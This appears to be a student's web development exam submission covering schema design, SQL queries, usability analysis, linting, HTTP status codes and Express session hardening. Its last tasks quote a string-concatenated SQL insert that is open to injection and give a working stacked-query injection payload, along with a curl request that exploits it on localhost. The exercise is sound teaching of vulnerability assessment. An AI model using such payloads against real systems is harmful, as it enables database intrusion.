## Task 1.1



![wdc-final-preparation-Page-3-1](https://minio.llycloud.com/image/uPic/image-20210706QZZGHQ.png) 

## Task 1.2

In the database scheme attached above, there is N-N relationships between user table and game table which connected by join table -- order table. 

Based on the N-N relationship by join table, there are several 1-N relationships to construct the N-N relationship. 

The first one is between user table and order table in order to create a reference relationship (order.user_id match user.user_id) to represent the one user could order multiple games 

The second one is between game table and order table in order to create a reference relationship (game.game_id match order.game_id) to represent the one game could be purchased by multiple games as the different order ids depends on different purchase timestamp.

 Based on above two 1-N relationship with foreign key implementation, there is a join table order has been constructed. As the principal of foregin kay which is a key used to link two tables together. 

Based on 1st normal form, the the address of user divided into user_address table, the platform and category of game are divided into sub tables. 

Based on 2nd normal form,when a composite key is used (a primary key consisting of multiple attributes), the other attributesshould relate to all parts of the key. The attributes of every table on the diagram above are related to primary key. 

Based on 3rd normal form, every columns are not reference other colums that aren's keys. The references only appear on foreign key connected to primary key. 

## Task 1.4

```sql
select username,email_address
from user
inner join `order` o on user.user_id = o.user_id
inner join game g on o.game_id = g.game_id
where o.order_id IN (
    select order_id
    from `order` as ino
    WHERE DATEDIFF(NOW(), ino.purchase_timestamp) < 90
)
and g.game_name like '%game_02%'
GROUP BY user.user_id
;

```



## Task 1.6

Compare my implementation to `https://store.steampowered.com/`, we both implementation the search system which adapted possibility for end user easily access / filter the required game by category, platform, features, price.

For operability, based on Cognitive load that Cognitive load describes the amount of thought/mental work required to complete a given task.

steam and my workaround both implement that conditional filters which helps user to easy find required games.

There is difference that stream used the draggle bar for price filter, and my workout required user manually input the start price and end price in order to filter the price range. The draggle bar is more convenient and less instructions required for end user. In another word, draggle bar descended the input error possibility compare to input bar.

Furthermore, for the platform and categories filter and search, steam provide a list of common selection for end user which reduce the complexity for user to remember the type of game required to input.

1. Affordance
   1. both implementation make the actions that users want to take easily accessible and readily perceivable.
   2. both implementation use `search` symbol that clearly reflect the meaning of search operation.
2. Consistency
   1. both implementation use consistent style / layout. Which stream use blue as the base color, and my search used green as base color.
   2. both implementation in relation to other parts of the site or other site. store clearly use header and navigation for user quick access the other pages. As we just required to implement login part, the navigation is easily adapted with the further requirements.
3. simplicity
   1. Avoid clutter, both implementation modularized the components including search bar, condition area and result display area.
4. Choice of words
   1. Both implementation use words that match the user's goals, clearly the search and condition input are clearly defined the functionality for allocated input area and button. The table title also clearly show the purpose of required data

So, for improvement of my implementation, i would consider the replace the input bar to selection bar which list the common type of categories or platform for end user. And also keep the input functionality in place for advanced search.

For the understandability, kinematic load describes the amount of physical work required to complete a given task.

1. Proximity
   1. Both implementation have related objects close to each other, for instance, the steam have more search conditions than my implementation, these conditions bars are mainly located at right side of website. in my implementation, these search conditions are close to search bar.
   2. positioning objects that are likely to be used together far away from each other creates extra effort to interact with them. Both site are well constructed, which are separate the different functional area to different functionality. for example, display areas are used to display results
2. Layers
   1. Avoid hiding controls multiple layers/menus/dialogs/pages deep. For my implementation there are only on layer hidden right side of search bottom which is a switch for different conditional search.
   2. Keep frequently used controls always available. In fact, my implementation default select `and search` condition for most commonly using conditions, and stream also provides a lot of default value.

Based on the Fitt's law, both implementation are shared the same properties that :

- Larger controls are easier to interact with
- closer controls are easier to interact with
- controls close to screen edges are easier to interact with.

Steam and my implementation used different and conspicuous color and design to outline the search dialog. And the search button with word `search`. we both provide the filter conditions of category, platform, features, price.

Both of steam and my workaround, every button has been properly labeled and every input bar/ select bar/ draggle bar have the completed instructions for what options will this area worked for.

For display result, the steam do not have table head to point at the purpose of search results. My implementation have a table title to classify the purpose of research results which makes user's more easily to understand the search results.

## Task 2.1

```sql
vnu --also-check-css $(find ./ | grep -v 'node_modules' | egrep '.html|.css' | sed -r 's/\\/\\//\\//g')

"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/index.html":30.13-30.18: error: End tag “div” seen, but there were open elements.
"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/index.html":27.17-27.20: error: Unclosed element “h2”.
"file:/Users/akide/IdeaProjects/WDC/Final/exam_part2/./public/stylesheets/style.css":77.1-77.4: error: CSS: Parse Error.
```

Css HTML validator can increase the website's quality score by helping find and fix broken links, broken redirects, and misspelled words. 

Validating with css html validator helps to make the website more accessible. 

The core reason to run your html document through a conformance checker is simple : to catch unintended mistakes. 

## Task 2.2

```sql
eslint $(find ./ -name '*.js'| grep -v 'node_modules' | sed -r 's/\\/\\//\\//g')

/home/ubuntu/final/exam_part2/routes/index.js
  12:7   warning  Unexpected console statement    no-console
  49:32  error    Use '===' to compare with null  no-eq-null
  50:34  error    Use '===' to compare with null  no-eq-null
  57:15  warning  Unexpected console statement    no-console
  64:21  warning  Unexpected console statement    no-console
  72:21  error    'tag' is not defined            no-undef
  73:34  error    'tag' is not defined            no-undef
  73:59  error    Missing semicolon               semi
  81:25  warning  Unexpected console statement    no-console

/home/ubuntu/final/exam_part2/routes/users.js
  18:59  error  Parsing error: Unexpected token function

/home/ubuntu/final/exam_part2/app.js
   43:11  warning  Unexpected console statement  no-console
  105:13  warning  Unexpected console statement  no-console

✖ 12 problems (6 errors, 6 warnings)
  1 error and 0 warnings potentially fixable with the `--fix` option.
```

Just notice that there is a issue could not be able to fix : 

```shell
/Users/akide/IdeaProjects/WDC/Final/exam_part2/routes/us
19:59 error Parsing error: Unexpected token function
✖ 1 problem (1 error, 0 warnings)
```

This issue is related to enlist setting which is not configure by provided enlist file, which i would provide following references :

 https://piazza.com/class/kirbdk29i9y65q?cid=612

 https://stackoverflow.com/a/53883984/14207562

 https://github.com/eslint/eslint/issues/8366#issuecomment-326776306 

As the javascript is a dynamic and loosely-typed language, is especially prone to developer error. Without the benefit of a compilation process, javascript code is typically executed in order to find syntax or other errors. linting tools like ESLint allow developers to discover problems with their JavaScript code without executing it. 

## Task 2.3

The http status code played in the role which let frontend to understand the status of server's response. for instance, 2xx class codes refer success responses. 4xx class codes refer client erros, 5xx class code rfer server errors. When client side js receive the different https status code, they can determine the is the response success or not, if the response failed, client side js could react the properly action to notify end user based on different type of error -- client side error or server side error. 

```js
res.end(); //send response
```

normally, the res.send() and res.end(), res.json() will send result to frontend via http protocol. 2xx class responsed code which refer successful response is the most common code we could seen in the http transmission, especially code 200. 

```js
res.sendStatus(400);
```

The 400 http status code refer the bad request which means the server do not understand the request due to invalid syntax. Based on the code, these 400 codes most often have produced by client side did not provided required data (this may be request body or request parameters or request query). The server could not react without client side send the proper request data. 

```js
res.sendStatus(401);
```

The 401 http status code refers that unauthorized or unauthenticated which means client must authenticate itslef to get the requested response. Based on the code, these 401 codes most often have been produced by client side login credentials is not accepted by server or when user request protected resources, the client do not have enough layer authority or under to provide authentication exchange identifier (e.g. session, jwt). 

```sql
res.sendStatus(500);
```

The 500 https status code refers the server has encountered a situation it doest't know how to handle. Based on the code, these 500 codes most often have been produced by server side issues such as the connection to database is unreachable, or the query is not able to execute. in other words, these issues always related server side misconfigurations, code issues, unreliable/unreachable integration services (mysql database) or maybe the server has been hacked by attack. Therefore could not able to produce correct compture to retrieve data as user requested. 

## Task2.4

The middleware played the role for web security in nodejs ecosystem. The middleware could place in front of real production route which provide functionality. For example, we could use `helmet` middleware to prevent http header vulnerabilities and place `express-brute` to rate limit the authorization end point and `express-html-sanitizer` for prevent xss attack.

In this application, there is a session middleware which used to give the authorization identifier for authenticate user.

First, the secret of session `secret` is hard coded into `app.js`. There is a improvement to use random secret `crypto.randomBytes(16).toString('hex')`

Second, as the session is cookie based by `express-session` implementation, so the consideration to secure the session cookie is required.

For instance

1. give a `sameSite` attribute blocks the ability to send a cookie in a cross-origin request. This provide protection against CSRF attacks.
2. give a `httpOnly` attribute blocks the ability to use the document.cookie object. This prevents XSS attacks from stealing the session identifier.
3. give `secure: true`  attribute will set cookies over HTTPS only
4. give a `max-age` to expire the cookie (auto logout)
5. use helmet `nocache` lib for supercharge the http header security related to Session security

Final configuration :

```jsx
const noCache = require('nocache');
app.use(noCache());

app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave:false,
    saveUninitialized:true,
    cookie: {
        httpOnly:true,
        secure:false,// Due to development purpose, should be enable in production environment (https required)
				sameSite:true,
        maxAge: 600000
    },
}));
```

There are a few research for how to secure the node.js web application by middleware:

[Security Best Practices for Express in Production](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)

- [Use TLS](https://expressjs.com/en/advanced/best-practice-security.html#use-tls)

  Transport layer security could secure the connection and data.

  We could use `https` package to identify itself using the certificate and to force clients to connect over TLS

  [Securely Connecting Express and Node.js Using Mutual TLS - Smallstep](https://smallstep.com/hello-mtls/doc/combined/express/nodejs)

  basics setup :

  ```
  const fs = require('fs');
  const https = require('https');
  const express = require('express');
  
  const app = express();
  
  app.get('/', (req, res) => {
    return res.send('Hello, world!');
  });
  
  https
    .createServer(
      {
        // ...
        cert: fs.readFileSync('server.crt'),
        key: fs.readFileSync('server.key'),
        // ...
      },
      app
    )
    .listen(9443);
  ```

- [Use Helmet](https://expressjs.com/en/advanced/best-practice-security.html#use-helmet)

  Helmet can help protect your app from some well-known web vulnerabilities by setting HTTP headers appropriately.

  ```
  var helmet = require('helmet')
  app.use(helmet())
  app.disable('x-powered-by')
  ```

- [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely)

  use `cookie-session` middleware the configure the change the default session cookie name and secure the cookies

  ```
  var session = require('express-session')
  app.set('trust proxy', 1) // trust first proxy
  app.use(session({
    secret: 's3Cur3',
    name: 'sessionId'
  }))
  ```

  Then configure the cookie security options

  ```
  var session = require('cookie-session')
  var express = require('express')
  var app = express()
  
  var expiryDate = new Date(Date.now() + 60 * 60 * 1000) // 1 hour
  app.use(session({
    name: 'session',
    keys: ['key1', 'key2'],
    cookie: {
      secure: true,
      httpOnly: true,
      domain: 'example.com',
      path: 'foo/bar',
      expires: expiryDate
    }
  }))
  ```

- [Prevent brute-force attacks against authorization](https://expressjs.com/en/advanced/best-practice-security.html#prevent-brute-force-attacks-against-authorization)

  We could user `express-brute` middleware to limit the rate for client request login or authentication api endpoint.

  ```
  const ExpressBrute = require('express-brute');
  const store = new ExpressBrute.MemoryStore();
  const bruteforce = new ExpressBrute(store);
  
  app.post('/login',
    bruteforce.prevent,
    (req, res, next) => {
      res.send('Success!');
    }
  );
  ```

  Then when an attack hits the route too often, then the attacker will get a 429 response indicating the route has been hit too many times from the same origin.

  [Node.js Best Practices - Improving Security](https://medium.com/swlh/node-js-best-practices-improving-security-2c772419d475)

## Task 2.5

Investigation flow :

1. Looking for which query did not use proper preparation statement Then we found following code contains vulnerability from `/addpost` endpoint in `index.js`

   ```jsx
   let tags = '';
                   for(const tag of req.body.tags){
                       tags += `('${tag}',LAST_INSERT_ID()),`;
                   }
                   tags = tags.replace(/,$/,'');
                   var query = 'INSERT INTO question_tags (tagname,question) VALUES '+tags+';';
   ```

2. After analysis this code, the main issues is the `tag` variable used string concatenation, and `tag` is from `req.body.tags`

3. Then we could looking into sql and try to concatenation a SQL injection example query shows below :

   ```sql
   INSERT INTO questions (author,title,content,timestamp) VALUES (1,'12345','123455',NOW());
   INSERT INTO question_tags (tagname, question)
   VALUES ('123',LAST_INSERT_ID());
           INSERT INTO question_tags (tagname, question)
           VALUES ((select version()), LAST_INSERT_ID());
       -- -', LAST_INSERT_ID())；
   ```

4. In the above SQL, i put a `'` after 123 then replace `,LAST_INSERT_ID());` to make this query end of execution. After that there are any additional attack query cloud be insert into database. so i choice add one more tag which contains database system version, finally use `-- -'` annotation to ignore original statement.

5. Based on get `/posts` endpoint will display the information for `q_tags.tags` from database, so that we could view our injection by webpage.

   ```sql
   var query = `SELECT  q_tags.tags,
                             users.given_name AS author,
                             questions.title,
                             questions.content,
                             questions.timestamp,
                             questions.q_id,
                             IFNULL(q_up.tally,0) AS upvotes
                     FROM questions INNER JOIN users ON questions.author = users.u_id
                     LEFT JOIN q_tags ON q_tags.question = questions.q_id
                     LEFT JOIN q_up ON q_up.question = questions.q_id;`;
   ```

## Task 2.6

![Untitled(6)](https://minio.llycloud.com/image/uPic/image-20210706mMPoIS.png)

```bash
curl --request POST \
  --url http://localhost:3000/addpost \
  --header 'Content-Type: application/json' \
  --cookie connect.sid=s%253A2JPRmUjDzgPkfxRb2Y0aOA-eDjESSZ7Y.YNBtrnuAUmFO6l6Bt4BkbBo1jJ1KijIpvVk%252BlTbWD2o \
  --data '{
	"title":"test",
	"content":"test",
	"tags":["test'\'',LAST_INSERT_ID());INSERT INTO question_tags (tagname, question)VALUES ((select version()), LAST_INSERT_ID());-- -"],
	"upvotes":0}'
```